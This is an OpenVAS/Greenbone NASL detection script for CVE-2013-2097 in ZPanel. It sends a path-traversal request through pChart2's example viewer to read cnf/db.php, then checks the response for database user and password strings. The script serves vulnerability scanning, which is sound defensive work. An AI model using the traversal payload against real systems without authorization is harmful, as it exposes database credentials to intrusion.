# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:zpanel:zpanel";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105415");
  script_version("2023-07-25T05:05:58+0000");
  script_cve_id("CVE-2013-2097");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");

  script_name("ZPanel Information Disclosure Vulnerability");

  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/134030");

  script_tag(name:"vuldetect", value:"Try to read 'cnf/db.php' via a special crafted HTTP GET request");
  script_tag(name:"insight", value:"The vulnerability is due to a vulnerable version of pChart allowing remote, unauthenticated, users to read arbitrary files found on the filesystem.");
  script_tag(name:"solution", value:"Updates are available");
  script_tag(name:"summary", value:"ZPanel is prone to a remote information disclosure vulnerability.");
  script_tag(name:"affected", value:"Zpanel <= 10.1.0");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-02-24 20:36:00 +0000 (Mon, 24 Feb 2020)");
  script_tag(name:"creation_date", value:"2015-10-21 11:32:00 +0200 (Wed, 21 Oct 2015)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_dependencies("gb_zpanel_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("zpanel/installed");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + '/etc/lib/pChart2/examples/index.php?Action=View&Script=../../../../cnf/db.php';
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

buf = str_replace( string:buf, find:"&nbsp;", replace:" " );

if( "Database configuration file" >< buf && "$user" >< buf && "$pass" >< buf )
{
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
